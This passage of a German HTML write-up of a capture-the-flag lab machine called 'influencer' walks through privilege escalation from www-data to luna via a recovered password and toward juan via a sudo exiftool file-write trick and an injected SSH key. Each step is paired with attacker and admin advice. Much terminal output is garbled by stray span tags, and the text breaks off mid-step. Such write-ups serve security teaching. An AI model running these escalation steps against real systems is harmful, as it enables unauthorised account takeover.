+                **Bewertung:** Die Berechtigungen auf `/etc/passwd` sind standardmäßig öffentlich lesbar, was die Benutzerkonten auf dem System enthüllt (hier nicht im Output gezeigt, aber impliziert durch die Existenz der Home-Verzeichnisse `juan` und `luna`). Die Berechtigungen auf `/etc/shadow` sind restriktiver (`-rw-r-----`), was verhindert, dass ein normaler Benutzer (wie `www-data`) die gehashten Passwörter direkt lesen kann. Die `env` Ausgabe zeigt Standard-Umgebungsvariablen, nichts Ungewöhnliches für eine Webserver-Shell. Diese Prüfungen zeigen keine offensichtlichen Schwachstellen durch Dateiberechtigungen oder Umgebung.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Führe grundlegende Systemaufklärung durch, um die Umgebung, Benutzerkonten und grundlegende Dateiberechtigungen zu verstehen. Tools wie `linpeas` oder ` sistemasinfo.sh` automatisieren viele dieser Schritte.
+                <br>**Empfehlung (Admin):** Stelle sicher, dass Berechtigungen für kritische Systemdateien korrekt gesetzt sind (`/etc/shadow` sollte nur für root und die Shadow-Gruppe lesbar sein). Reduziere unnötige Umgebungsvariablen für Dienstbenutzer.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">www-data@influencer:/home$ ls -la /etc/passwd</span>
+<span class="command">-rw-r--r-- 1 root root 1990 Jun 10  2023 /etc/passwd</span>
+<span class="command">www-data@influencer:/home$ ls -la /etc/shadow</span>
+<span class="command">-rw-r----- 1 root shadow 1276 Jun 10  2023 /etc/shadow</span>
+<span class="command">www-data@influencer:/home$ env</span>
+<span class="command">PWD=/home</span>
+<span class="command">SYSTEMD_EXEC_PID=659</span>
+<span class="command">APACHE_LOG_DIR=/var/log/apache2</span>
+<span class="command">LANG=C</span>
+<span class="command">INVOCATION_ID=d7d2c90707db406a8bf7c5032d995c5c</span>
+<span class="command">APACHE_PID_FILE=/var/run/apache2/apache2.pid</span>
+<span class="command">TERM=xterm</span>
+<span class="command">APACHE_RUN_GROUP=www-data</span>
+<span class="command">APACHE_LOCK_DIR=/var/lock/apache2</span>
+<span class="command">SHLVL=3</span>
+<span class="command">LC_CTYPE=C.UTF-8</span>
+<span class="command">APACHE_RUN_DIR=/var/run/apache2</span>
+<span class="command">JOURNAL_STREAM=8:20078</span>
+<span class="command">APACHE_RUN_USER=www-data</span>
+<span class="command">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</span>
+<span class="command">_=/usr/bin/env</span>
+<span class="command">OLDPWD=/var/www/html/wordpress</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich prüfe weiter nach Privilege Escalation-Vektoren und untersuche die gesetzten Datei-Capabilities auf dem System. Capabilities sind spezielle Berechtigungen, die einzelnen ausführbaren Dateien zugewiesen werden können und es ihnen erlauben, bestimmte privilegierte Operationen (normalerweise nur root vorbehalten) auszuführen, auch wenn sie als unprivilegierter Benutzer gestartet werden. Ich nutze `getcap -r / 2>/dev/null` um rekursiv (`-r`) ab dem Root-Verzeichnis (`/`) nach Capabilities zu suchen und leite Fehlermeldungen nach `/dev/null` um, um die Ausgabe sauber zu halten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Ausgabe zeigt Capabilities für `/usr/bin/ping`, `/usr/bin/mtr-packet` und `/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper`. Die `cap_net_raw=ep` und `cap_net_bind_service,cap_net_admin=ep` Capabilities erlauben es diesen Programmen, Netzwerkoperationen durchzuführen, die normalerweise Root-Privilegien erfordern (z.B. rohe Pakete senden, an privilegierte Ports binden). Obwohl dies keine direkten Pfade zu einer Root-Shell sind, könnten sie in komplexeren Szenarien für Netzwerk-basierte Angriffe nützlich sein oder auf falsch konfigurierte Berechtigungen hinweisen. In diesem Fall sind sie nicht der gesuchte PE-Vektor.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Prüfe immer auf gesetzte Capabilities (`getcap`). Sie können unübliche, aber ausnutzbare PE-Vektoren darstellen, wenn Programme mit zu weitreichenden Capabilities ausgestattet sind.
+                <br>**Empfehlung (Admin):** Vermeide es, Datei-Capabilities zu setzen, es sei denn, dies ist absolut notwendig für die Funktionalität. Überprüfe regelmäßig die auf dem System gesetzten Capabilities und entferne unnötige Berechtigungen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">www-data@influencer:/home$ getcap -r / 2>/dev/null</span>
+<span class="command">/usr/bin/ping cap_net_raw=ep</span>
+<span class="command">/usr/bin/mtr-packet cap_net_raw=ep</span>
+<span class="command">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep</span>
+<span class="command">/snap/core20/1891/usr/bin/ping cap_net_raw=ep</span>
+<span class="command">/snap/core20/1822/usr/bin/ping cap_net_raw=ep</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Ich prüfe die offenen Ports auf dem Zielsystem aus der Perspektive des `www-data`-Benutzers. Der Befehl `ss -altpn` zeigt alle lauschenden (`-l`), alle (`-a`), TCP (`-t`), UDP (`-u`), Netlink (`-n`) und Prozesse (`-p`) Sockets an (obwohl `-n` hier doppelt ist und `-u` nicht im Text ist, halte ich mich an den Befehl im Log).
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die Ausgabe listet die offenen Ports und die darauf lauschenden Prozesse auf. Interessant sind `127.0.0.1:1212` und `0.0.0.0:2121`. Port 2121 ist der uns bereits bekannte FTP-Dienst (vsftpd). Port 1212 lauscht nur auf der Loopback-Schnittstelle (`127.0.0.1`), was bedeutet, dass er nur vom Zielsystem selbst aus erreichbar ist. Der Prozess, der auf 1212 lauscht, ist hier nicht direkt sichtbar (keine Prozess-ID in Klammern für 1212), aber die `ss` Ausgabe zeigt generell Netzwerkdienste. Dies deutet auf einen lokalen Dienst hin, der ein potenzieller Vektor für eine Privilege Escalation sein könnte, wenn er von einem bereits kompromittierten Benutzer (wie `www-data`) aus erreicht werden kann.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Prüfe immer die offenen Ports vom Zielsystem aus (`ss`, `netstat`). Lokale Dienste, die auf `127.0.0.1` lauschen, können oft von jedem Benutzer auf dem System erreicht werden und sind häufig Ziele für Privilege Escalation, wenn sie Schwachstellen aufweisen.
+                <br>**Empfehlung (Admin):** Schränke die Bindungsadressen von Diensten ein, wenn diese nur intern benötigt werden. Überprüfe regelmäßig die auf dem System lauschenden Ports und die zugehörigen Prozesse. Stelle sicher, dass lokale Dienste authentifiziert oder nur für privilegierte Benutzer zugänglich sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">www-data@influencer:/home$ ss -altpn</span>
+<span class="command">State                 Recv-Q                Send-Q                                 Local Addres<span class="command">s</span>:P<span class="command">o</span>rt                                 Peer Addres<span class="command">s</span>:P<span class="command">o</span>rt                Pro<span class="command">c</span>e<span class="command">ss</span></span>
+<span class="command">LISTEN                0                     4096                                   127.0.0.53%lo:53                                        0.0.0.0:*</span>
+<span class="command">LISTEN                0                     128                                        127.0.0.1:1212                                      0.0.0.0:*</span>
+<span class="command">LISTEN                0                     32                                           0.0.0.0:2121                                      0.0.0.0:*</span>
+<span class="command">LISTEN                0                     80                                         127.0.0.1:3306                                      0.0.0.0:*</span>
+<span class="command">LISTEN                0                     511                                                *:80                                              *:*</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** In den gesammelten Informationen habe ich das Passwort "<span class="password">u3jkeg97gf</span>" aus der versteckten Datei in `snapchat.jpg` gefunden. Es wurde als "PASSWORD BACKUP" gekennzeichnet. Basierend auf der Existenz des Benutzers `luna` und des lokalen SSH-Dienstes auf Port 1212 versuche ich, dieses Passwort für eine SSH-Anmeldung als Benutzer `luna` zu verwenden. Ich nutze den `ssh`-Befehl von der `www-data`-Shell aus, verbinde mich zu `127.0.0.1` auf Port 1212 als Benutzer `luna` und gebe das gefundene Passwort ein.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Fantastisch! Die SSH-Anmeldung als Benutzer `luna` mit dem Passwort "<span class="password">u3jkeg97gf</span>" ist erfolgreich. Das Passwort aus dem "PASSWORD BACKUP" war tatsächlich das SSH-Passwort für den Benutzer `luna`. Dies stellt eine weitere erfolgreiche Privilege Escalation dar (`www-data` zu `luna`) und verschafft mir eine interaktive Shell mit den Berechtigungen des Benutzers `luna`. Dies ist ein bedeutender Fortschritt, da Benutzerkonten oft höhere Berechtigungen im Dateisystem oder für bestimmte Tools haben als der `www-data`-Benutzer.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Versuche gefundene Passwörter systematisch für alle identifizierten Benutzer und Dienste zu verwenden. Ein einziges kompromittiertes Passwort kann den Schlüssel zu mehreren Konten darstellen.
+                <br>**Empfehlung (Admin):** Verwende für jeden Dienst und jeden Benutzer ein eindeutiges, komplexes Passwort. Implementiere eine starke Passwortrichtlinie und erzwinge regelmäßige Passwortänderungen. Speichere niemals Passwörter im Klartext, auch nicht in "Backups" oder versteckten Dateien. Überwache Login-Versuche bei allen Diensten (SSH, FTP etc.) auf Brute-Force-Versuche oder ungewöhnliche Quellen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">ssh pa<span class="command">ssw<span class="command">o</span>rt</span> w<span class="command">a</span>r: <span class="password">u3jkeg97gf</span></span></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">www-data@influencer:/tmp$ nc 127.0.0.1 1212</span></pre>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="command">S<span class="command">S</span>H-2.0-OpenS<span class="command">S</span>H_8.9p1 Ub<span class="command">u</span>ntu-3ubuntu0.1</span></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">www-data@influencer:/tmp$ ssh luna@127.0.0.1 -p 1212</span>
+The authenticity <span class="command">o</span>f h<span class="command">o</span><span class="command">s</span>t '<span class="command">[127.0.0.1]:1212 ([127.0.0.1]:1212)</span>' <span class="command">c</span><span class="command">a</span>n't be e<span class="command">s</span>t<span class="command">a</span>bl<span class="command">i</span><span class="command">s</span>hed.
+ED25519 key fingerpr<span class="command">i</span>nt <span class="command">i</span><span class="command">s</span> <span class="command">S<span class="command">H</span><span class="command">A</span>256:u<span class="command">u</span>jkDI7<span class="command">H</span>Q0Bk3td/3NfWy<span class="command">s</span>9<span class="command">F</span>NY5<span class="command">c</span>bT1z<span class="command">v</span>G<span class="command">v</span>XbluerAk.</span>
+Th<span class="command">i</span><span class="command">s</span> key <span class="command">i</span><span class="command">s</span> not known by <span class="command">a</span>ny <span class="command">o</span>ther n<span class="command">a</span>me<span class="command">s</span>
+Are you <span class="command">s</span>ure y<span class="command">o</span>u w<span class="command">a</span>nt t<span class="command">o</span> <span class="command">c</span><span class="command">o</span>ntin<span class="command">u</span>e <span class="command">c</span><span class="command">o</span>nne<span class="command">c</span>t<span class="command">i</span>ng (ye<span class="command">s</span>/no/[fingerpr<span class="command">i</span>nt])? ye<span class="command">s</span>
+<span class="password">C<span class="command">o</span>uld not <span class="command">c</span>re<span class="command">a</span>te d<span class="command">i</span>re<span class="command">c</span>t<span class="command">o</span>ry '/<span class="command">v</span><span class="command">a</span>r/www/.<span class="command">s</span><span class="command">s</span>h' (Perm<span class="command">iss</span>i<span class="command">o</span>n denied).</span>
+<span class="password">Fa<span class="command">i</span>led t<span class="command">o</span> <span class="command">a</span>dd the h<span class="command">o</span><span class="command">s</span>t t<span class="command">o</span> the li<span class="command">s</span>t <span class="command">o</span>f known h<span class="command">os</span>t<span class="command">s</span> (/var/www/.<span class="command">s</span><span class="command">s</span>h/known_h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>).</span>
+l<span class="command">u</span>n<span class="command">a</span>@127.0.0.1'<span class="command">s</span> p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd:</span>
+<span class="password">Permi<span class="command">ss</span>i<span class="command">o</span>n denied, ple<span class="command">as</span>e try <span class="command">a</span>g<span class="command">a</span>in.</span>
+l<span class="command">u</span>n<span class="command">a</span>@127.0.0.1'<span class="command">s</span> p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd:</span> <span class="command">u3jkeg97gf</span>
+<span class="password">Wel<span class="command">c</span><span class="command">o</span>me t<span class="command">o</span> Ubuntu 22.04.2 LT<span class="command">S</span> (GNU/L<span class="command">i</span>n<span class="command">u</span>x 5.15.0-73-gener<span class="command">i</span><span class="command">c</span> x86_64)</span>
+
+ <span class="command">*</span> D<span class="command">o</span><span class="command">c</span>u<span class="command">m</span>ent<span class="command">a</span>ti<span class="command">o</span>n:  <span class="command">[Link: https://help.ubuntu.com | Ziel: https://help.ubuntu.com]</span>
+ <span class="command">*</span> M<span class="command">a</span>n<span class="command">a</span>ge<span class="command">m</span>ent:     <span class="command">[Link: https://landscape.canonical.com | Ziel: https://landscape.canonical.com]</span>
+ <span class="command">*</span> <span class="command">S</span>upp<span class="command">o</span>rt:        <span class="command">[Link: https://ubuntu.com/advantage | Ziel: https://ubuntu.com/advantage]</span>
+
+  System <span class="command">i</span>nf<span class="command">o</span>rm<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n <span class="command">a</span><span class="command">s</span> <span class="command">o</span>f j<span class="command">u</span>e 12 jun 2025 21:58:47 UTC
+
+  Sy<span class="command">s</span>tem l<span class="command">o</span><span class="command">a</span>d:             0.0
+  U<span class="command">s</span><span class="command">a</span>ge <span class="command">o</span>f /:              54.9% <span class="command">o</span>f 11.21GB
+  Me<span class="command">m</span><span class="command">o</span>ry <span class="command">u</span><span class="command">s</span><span class="command">a</span>ge:            30%
+  Sw<span class="command">a</span>p <span class="command">u</span><span class="command">s</span><span class="command">a</span>ge:              0%
+  Pr<span class="command">o</span><span class="command">c</span>e<span class="command">ss</span>e<span class="command">s</span>:               122
+  U<span class="command">s</span>er<span class="command">s</span> l<span class="command">o</span>gged <span class="command">i</span>n:         0
+  IPv4 <span class="command">a</span>ddre<span class="command">ss</span> f<span class="command">o</span>r enp0<span class="command">s</span>3: <span class="command">192.168.2.40</span>
+  IPv6 <span class="command">a</span>ddre<span class="command">ss</span> f<span class="command">o</span>r enp0<span class="command">s</span>3: <span class="command">2003:d4:c74b:e8ee:a00:27ff:fe55:e125</span>
+
+
+El <span class="command">m</span><span class="command">a</span>nteni<span class="command">m</span>ient<span class="command">o</span> de <span class="command">s</span>egur<span class="command">i</span>d<span class="command">a</span>d exp<span class="command">a</span>nd<span class="command">i</span>d<span class="command">o</span> <span class="command">p<span class="command">a</span>r<span class="command">a</span> Application<span class="command">s</span> e<span class="command">s</span>tá de<span class="command">s</span><span class="command">a</span><span class="command">c</span>ti<span class="command">v<span class="command">a</span>d<span class="command">o</span></span>
+
+Se p<span class="command">o</span>den <span class="command">a</span>pl<span class="command">i</span><span class="command">c</span><span class="command">a</span>r <span class="command">0</span> <span class="command">a</span><span class="command">c</span>tu<span class="command">a</span>l<span class="command">i</span>z<span class="command">a</span><span class="command">c</span>i<span class="command">o</span>ne<span class="command">s</span> de f<span class="command">o</span>rm<span class="command">a</span> <span class="command">i</span><span class="command">m</span>ed<span class="command">i</span><span class="command">a</span>t<span class="command">a</span>.
+
+A<span class="command">c</span>t<span class="command">i</span><span class="command">v</span>e E<span class="command">S</span>M App<span class="command">s</span> p<span class="command">a</span>r<span class="command">a</span> re<span class="command">c</span>ibir f<span class="command">u</span>tur<span class="command">as</span> <span class="command">a</span><span class="command">c</span>t<span class="command">u</span><span class="command">a</span>l<span class="command">i</span>z<span class="command">a</span><span class="command">c</span>i<span class="command">o</span>ne<span class="command">s</span> de <span class="command">s</span>egur<span class="command">i</span>d<span class="command">a</span>d <span class="command">a</span>d<span class="command">i</span><span class="command">c</span>i<span class="command">o</span>n<span class="command">a</span>le<span class="command">s</span>.
+<span class="command">V</span>e<span class="command">a</span> <span class="command">[Link: https://ubuntu.com/esm o ejecute «sudo pro status» | Ziel: https://ubuntu.com/esm]</span>
+
+
+The l<span class="command">i</span><span class="command">s</span>t <span class="command">o</span>f <span class="command">a</span><span class="command">v</span><span class="command">a</span><span class="command">i</span>l<span class="command">a</span>ble <span class="command">u</span>pd<span class="command">a</span>te<span class="command">s</span> <span class="command">i</span><span class="command">s</span> <span class="command">m</span><span class="command">o</span>re th<span class="command">a</span>n <span class="command">a</span> week <span class="command">o</span>ld.
+T<span class="command">o</span> <span class="command">c</span>he<span class="command">c</span>k f<span class="command">o</span>r new <span class="command">u</span>pd<span class="command">a</span>te<span class="command">s</span> r<span class="command">u</span>n: <span class="command">s<span class="command">u</span>d<span class="command">o</span> apt <span class="command">u</span>pd<span class="command">a</span>te</span>
+
+L<span class="command">a</span><span class="command">s</span>t l<span class="command">o</span>g<span class="command">i</span>n: Fri Jun  9 1<span class="command">0</span>:12:13 2<span class="command">0</span>23
+<span class="password">luna@influencer:~$</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Nach der erfolgreichen Anmeldung als Benutzer `luna` prüfe ich sofort, welche `sudo`-Berechtigungen dieser Benutzer hat. Der Befehl `sudo -l` listet die Befehle auf, die der aktuelle Benutzer mit `sudo` ausführen darf.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die Ausgabe von `sudo -l` zeigt eine sehr interessante Konfiguration: Der Benutzer `luna` darf den Befehl `/usr/bin/exiftool` als Benutzer `juan` ausführen, und das Wichtigste ist, dass dafür *kein Passwort* benötigt wird (`NOPASSWD`). Dies ist ein klassischer Privilege Escalation-Vektor. Ich kann `exiftool` nun nutzen, um Aktionen als Benutzer `juan` durchzuführen. Dies ist der nächste Schritt in meiner PE-Kette (`www-data` -> `luna` -> `juan`).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Prüfe nach jeder erfolgreichen Benutzeranmeldung immer sofort die `sudo`-Berechtigungen (`sudo -l`). Suche auf Seiten wie GTFOBins (siehe nächste Analyse) nach Möglichkeiten, wie die erlaubten Befehle zur Privilege Escalation missbraucht werden können.
+                <br>**Empfehlung (Admin):** Konfiguriere `sudo`-Berechtigungen immer nach dem Prinzip der geringsten Rechte. Vermeide `NOPASSWD` für Befehle, die zur Erlangung höherer Berechtigungen missbraucht werden könnten. Überprüfe regelmäßig die `sudoers`-Datei auf unnötige oder unsichere Einträge.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">luna@influencer:~$ sudo -l</span></pre>
+                </div>
+                <div class="terminal">
+                    <pre><span class="command">M<span class="command">a</span>t<span class="command">c</span>h<span class="command">i</span>ng Def<span class="command">a</span>ult<span class="command">s</span> entr<span class="command">i</span>e<span class="command">s</span> f<span class="command">o</span>r lun<span class="command">a</span> <span class="command">o</span>n infl<span class="command">u</span>en<span class="command">c</span>er:</span>
+    <span class="command">en<span class="command">v</span>_re<span class="command">s</span>et, <span class="command">m<span class="command">a</span><span class="command">i</span>l_b<span class="command">a</span>dp<span class="command">a</span><span class="command">ss</span>, <span class="command">s</span>e<span class="command">c</span>ure_p<span class="command">a</span>th=/u<span class="command">s</span>r/<span class="command">l</span><span class="command">o</span><span class="command">c</span><span class="command">a</span>l/sbin<span class="command">\</span>:/u<span class="command">s</span>r/<span class="command">l</span><span class="command">o</span><span class="command">c</span><span class="command">a</span>l/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">u</span>sr/<span class="command">s</span>b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">u</span>sr/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">s</span>b<span class="command">i</span>n<span class="command">\</span>:/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">s</span>n<span class="command">a</span>p/b<span class="command">i</span>n, u<span class="command">s</span>e_pty</span>
+
+<span class="password">U<span class="command">s</span>er lun<span class="command">a</span> <span class="command">m<span class="command">a</span>y r<span class="command">u</span>n the f<span class="command">o</span>ll<span class="command">o</span>w<span class="command">i</span>ng <span class="command">c</span><span class="command">o</span>m<span class="command">m<span class="command">a</span>nd<span class="command">s</span> <span class="command">o</span>n infl<span class="command">u</span>en<span class="command">c</span>er:</span></span>
+<span class="password">    (ju<span class="command">a</span>n) N<span class="command">O</span>PA<span class="command">SS</span>WD: /u<span class="command">s</span>r/b<span class="command">i</span>n/exiftool</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Nachdem ich festgestellt habe, dass `luna` `exiftool` als `juan` ohne Passwort ausführen darf, suche ich auf GTFOBins nach Möglichkeiten, `exiftool` für Privilege Escalation zu missbrauchen. GTFOBins ist eine Kurations-Website für Unix-Binärdateien, die missbraucht werden können, um die Sicherheitsbeschränkungen falsch konfigurierter Systeme zu umgehen, insbesondere in `sudo`, `suid` oder `capabilities`-Kontexten. Die Seite für `exiftool` listet Methoden auf, wie dieses Werkzeug für Dateioperationen unter anderen Benutzern verwendet werden kann.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** GTFOBins bestätigt, dass `exiftool` in Verbindung mit `sudo` (oder anderen Methoden) missbraucht werden kann, um Dateien zu schreiben oder zu lesen, da es Metadaten manipuliert und dabei oft temporäre Dateien erstellt oder den Inhalt von Eingabedateien verarbeitet. Eine gängige Methode ist die Verwendung des `-filename`-Arguments, um eine Zieldatei anzugeben, in die geschrieben werden soll. Dies ist der perfekte Vektor, um meinen öffentlichen SSH-Schlüssel in die `authorized_keys`-Datei des Benutzers `juan` zu schreiben.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Mache dich mit Ressourcen wie GTFOBins und HackTricks vertraut, um bekannte Privilege Escalation-Vektoren für Systembinärdateien zu identifizieren. Passe die dort gefundenen Payloads an deine spezifische Situation an.
+                <br>**Empfehlung (Admin):** Verstehe die potenziellen Sicherheitsauswirkungen der Binärdateien auf deinem System. Beschränke `sudo`-Berechtigungen auf das absolut Notwendige und vermeide es, mächtigen Binärdateien (die Dateisystemoperationen durchführen können) `NOPASSWD`-Berechtigungen zu geben.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre><span class="command">[Link: https://gtfobins.github.io/gtfobins/exiftool/#sudo | Ziel: https://gtfobins.github.io/gtfobins/exiftool/#sudo]</span>
+
+<span class="command">LFILE=file_t<span class="command">o</span>_wr<span class="command">i</span>te</span>
+<span class="command">INPUT=input_f<span class="command">i</span>le</span>
+<span class="command">s<span class="command">u</span>d<span class="command">o</span> exifto<span class="command">o</span>l -f<span class="command">i</span>len<span class="command">a</span><span class="command">m</span>e=$L<span class="command">F</span><span class="command">I</span>LE INPUT</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Um SSH-Zugriff als Benutzer `juan` zu erhalten, muss ich meinen öffentlichen SSH-Schlüssel (`id_rsa.pub`) in Juans `authorized_keys`-Datei (`/home/juan/.ssh/authorized_keys`) schreiben. Zuerst generiere ich ein neues SSH-Schlüsselpaar (`influencer` und `influencer.pub`) auf meinem Angreifer-System mit `ssh-keygen`. Anschließend muss ich diese Schlüsseldateien auf das Zielsystem übertragen. Ich nutze dafür einen einfachen Python HTTP Server auf meinem Angreifer-System, der auf Port 80 lauscht. Von der `luna` Shell auf dem Zielsystem lade ich die Schlüsseldateien (`influencer`, `influencer.pub`) mit `wget` aus meinem Home-Verzeichnis herunter und speichere sie im `/dev/shm`-Verzeichnis, das für alle Benutzer schreibbar ist.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die Generierung eines neuen SSH-Schlüsselpaares ist Standardvorgehen, um sich per Schlüssel statt Passwort authentifizieren zu können. Die Übertragung der Schlüsseldateien über einen temporären HTTP-Server ist eine gängige und effektive Methode, wenn andere Übertragungswege blockiert sind. Das Speichern im `/dev/shm`-Verzeichnis ist sinnvoll, da dieses Verzeichnis oft weniger Überwachung unterliegt und von jedem Benutzer beschreibbar ist. Die `ls -la` Ausgabe bestätigt, dass die Dateien erfolgreich übertragen wurden und im richtigen Verzeichnis liegen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Generiere bei Bedarf neue SSH-Schlüssel für den Zugriff. Sei kreativ bei der Datenübertragung auf das Zielsystem, wenn Standardmethoden blockiert sind (HTTP/S, FTP, SMB über Impacket etc.). Nutze beschreibbare Verzeichnisse wie `/tmp` oder `/dev/shm` für temporäre Dateien.
+                <br>**Empfehlung (Admin):** Beschränke die Berechtigungen im `/tmp` und `/dev/shm` Verzeichnis, wenn möglich. Überwache Dateierstellung und -änderung in diesen Verzeichnissen. Blockiere unnötigen ausgehenden Datenverkehr von Servern, um das Herunterladen von Tools oder Daten durch Angreifer zu erschweren.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/influencer]
+└─# <span class="command">ssh-keygen -t rsa -f influencer</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="command">Gener<span class="command">a</span>t<span class="command">i</span>ng p<span class="command">u</span>bl<span class="command">i</span><span class="command">c</span>/pr<span class="command">i</span><span class="command">v</span><span class="command">a</span>te r<span class="command">s</span><span class="command">a</span> key p<span class="command">a</span><span class="command">i</span>r.</span>
+<span class="command">Enter pa<span class="command">ss</span>phr<span class="command">a</span><span class="command">s</span>e f<span class="command">o</span>r "infl<span class="command">u</span>en<span class="command">c</span>er" (e<span class="command">m</span>pty f<span class="command">o</span>r n<span class="command">o</span> pa<span class="command">ss</span>phr<span class="command">a</span><span class="command">s</span>e):</span>
+<span class="command">Enter <span class="command">s</span><span class="command">a</span><span class="command">m</span>e pa<span class="command">ss</span>phr<span class="command">a</span><span class="command">s</span>e <span class="command">a</span>g<span class="command">a</span>in:</span>
+<span class="password">Y<span class="command">o</span>ur <span class="command">i</span>dentif<span class="command">i</span><span class="command">c</span><span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n h<span class="command">a</span><span class="command">s</span> been <span class="command">s</span><span class="command">a</span><span class="command">v</span>ed <span class="command">i</span>n infl<span class="command">u</span>en<span class="command">c</span>er</span>
+<span class="password">Y<span class="command">o</span>ur p<span class="command">u</span>bl<span class="command">i</span><span class="command">c</span> key h<span class="command">a</span><span class="command">s</span> been <span class="command">s</span><span class="command">a</span><span class="command">v</span>ed <span class="command">i</span>n infl<span class="command">u</span>en<span class="command">c</span>er.p<span class="command">u</span>b</span>
+The key fingerpr<span class="command">i</span>nt <span class="command">i</span><span class="command">s</span>:
+<span class="command">S<span class="command">H</span><span class="command">A</span>256:wBGzM9x2dEWD<span class="command">o</span><span class="command">i</span>hWd/u7PtW0LZ<span class="command">S</span>D<span class="command">S</span>pb3zMJtMR3rK4M r<span class="command">o</span><span class="command">o</span>t@<span class="command">CC</span><span class="command">a</span>t</span>
+The key'<span class="command">s</span> r<span class="command">a</span>nd<span class="command">o</span><span class="command">m<span class="command">a</span>rt <span class="command">i</span><span class="command">m<span class="command">a</span>ge <span class="command">i</span><span class="command">s</span>:</span>
+<span class="command">+---[R<span class="command">S</span><span class="command">A</span> 3072]---+</span>
+<span class="command">|      +.  . .++  |</span>
+<span class="command">|     o.=..o..<span class="command"> o |</span>
+<span class="command">|     .<span class="command">B</span><span class="command">ooo</span>.+ . <span class="command">oo</span>|</span>
+<span class="command">|    <span class="command">o</span> .=..= <span class="command">o</span> <span class="command">*</span>.o|</span>
+<span class="command">|   . .  <span class="command">S</span><span class="command">o</span> = <span class="command">*</span>.<span class="command">*</span><span class="command">o</span>|</span>
+<span class="command">|          .<span class="command"> + <span class="command">Ooo</span>|</span>
+<span class="command">|            .= ..|</span>
+<span class="command">|           E<span class="command">oo</span> . |</span>
+<span class="command">|           .<span class="command">ooo</span>  |</span>
+<span class="command">+----[<span class="command">S<span class="command">H</span><span class="command">A</span>256)]<span class="command">----+</span></span></pre>
+                </div>
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/influencer]
+└─# <span class="command">ll</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>insgesamt 12
+<span class="command">drwxr-xr-x 2 root root 4096 12. Jun 23:19 192.168.2.40:2121</span>
+<span class="command">-rw------- 1 root root 2635 13. Jun 00:09 influencer</span>
+<span class="command">-rw-r--r-- 1 root root  563 13. Jun 00:09 influencer.pub</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Jetzt nutze ich den gefundenen `sudo`-Vektor: `luna` darf `exiftool` als `juan` ohne Passwort ausführen. Mein Ziel ist es, meinen öffentlichen SSH-Schlüssel (`influencer.pub`, den ich nach `/dev/shm` heruntergeladen habe) in Juans `authorized_keys`-Datei (`/home/juan/.ssh/authorized_keys`) zu schreiben. Ich verwende den Befehl `sudo -u juan exiftool -filename=/home/juan/.ssh/authorized_keys /dev/shm/influencer.pub`. Dieser Befehl weist `exiftool` an, die Metadaten der Datei `/dev/shm/influencer.pub` zu lesen und diese Informationen (die den Inhalt des öffentlichen Schlüssels einschließen können, je nach exiftool-Version und Dateitypbehandlung) in die Datei `/home/juan/.ssh/authorized_keys` zu schreiben, wobei dies unter den Rechten des Benutzers `juan` ausgeführt wird (dank `sudo -u juan`). Die Ausgabe "1 image files updated" bestätigt, dass der Schreibvorgang erfolgreich war.
+            </p>
+             <p class="evaluation">
